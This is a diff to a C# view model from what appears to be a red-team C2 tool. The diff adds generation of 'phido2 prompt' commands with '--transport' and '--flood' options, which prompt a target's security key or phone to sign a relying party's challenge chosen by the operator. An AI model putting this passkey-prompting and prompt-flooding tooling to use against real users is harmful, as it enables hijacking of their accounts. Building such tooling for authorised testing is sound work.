@@ -32,6 +32,21 @@ public partial class C2CommandsDialogViewModel : ObservableObject, IC2CommandsDi
     private static readonly Dictionary<string, PublicKeyCredentialHint> s_hintsByApiName =
         s_hintApiNames.ToDictionary(kv => kv.Value, kv => kv.Key, StringComparer.OrdinalIgnoreCase);
 
+    /// <summary>
+    /// Maps the WebAuthn authenticator type hints onto the value of phido2's
+    /// <c>--transport</c> option (<c>usb</c> | <c>hybrid</c> | <c>any</c>). phido2 drives only
+    /// external USB security keys and phones (hybrid/caBLE), so <c>security-key</c> and
+    /// <c>hybrid</c> map directly; <see cref="PublicKeyCredentialHint.ClientDevice"/> (a
+    /// platform authenticator phido2 cannot act as) and <see cref="PublicKeyCredentialHint.None"/>
+    /// are deliberately absent, so no <c>--transport</c> is emitted and phido2 falls back to its
+    /// <c>any</c> default, letting the operator choose at the prompt.
+    /// </summary>
+    private static readonly Dictionary<PublicKeyCredentialHint, string> s_phido2Transports = new()
+    {
+        [PublicKeyCredentialHint.SecurityKey] = "usb",
+        [PublicKeyCredentialHint.Hybrid] = "hybrid"
+    };
+
     private readonly string? _rpId;
     private readonly string _challenge;
     private readonly IReadOnlyList<string> _credentialIds;
@@ -92,6 +107,11 @@ public partial class C2CommandsDialogViewModel : ObservableObject, IC2CommandsDi
     /// </summary>
     public ObservableCollection<string> PowerShellCommands { get; } = [];
 
+    /// <summary>
+    /// Gets the list of phido2 (macOS/Linux) commands to display.
+    /// </summary>
+    public ObservableCollection<string> Phido2Commands { get; } = [];
+
     public C2CommandsDialogViewModel(
         PublicKeyCredentialRequestOptions assertionOptions,
         string currentAddress)
@@ -144,6 +164,7 @@ public partial class C2CommandsDialogViewModel : ObservableObject, IC2CommandsDi
         MythicRebuildCommands();
         BofRebuildCommands();
         PowerShellRebuildCommands();
+        Phido2RebuildCommands();
     }
 
     private void SharpPasskeysRebuildCommands()
@@ -212,6 +233,36 @@ public partial class C2CommandsDialogViewModel : ObservableObject, IC2CommandsDi
         {
             PowerShellCommands.Add(PowerShellPrependKillBroker(PowerShellWrapWithPromptFlood($"Test-Passkey -RelyingPartyId {_rpId} -CredentialId {credentialId}{hintParameter}{windowHandleParameter}{privateParameter} -Challenge {_challenge}")));
         }
+    }
+
+    private void Phido2RebuildCommands()
+    {
+        Phido2Commands.Clear();
+
+        // phido2 only ever signs with the resident (discoverable) credentials on an external
+        // USB key or a phone, so it takes no allow-list / credential ID and a single command
+        // per relying party is generated. The Windows-only toggles (broker kill, window-handle
+        // spoof, private browser) have no phido2 equivalent and are ignored here; only the
+        // authenticator type hint (via --transport) and prompt flooding carry over.
+        string optionalParameters = Phido2BuildOptionalParameters();
+        Phido2Commands.Add($"phido2 prompt --rpid {_rpId}{optionalParameters} --challenge {_challenge}");
+    }
+
+    private string Phido2BuildOptionalParameters()
+    {
+        var parameters = new List<string>();
+
+        if (s_phido2Transports.TryGetValue(SelectedAuthenticatorTypeHint, out var transport))
+        {
+            parameters.Add($"--transport {transport}");
+        }
+
+        if (PromptFlood)
+        {
+            parameters.Add("--flood");
+        }
+
+        return parameters.Count > 0 ? " " + string.Join(" ", parameters) : string.Empty;
     }
 
     private string SharpPasskeysBuildOptionalParameters()
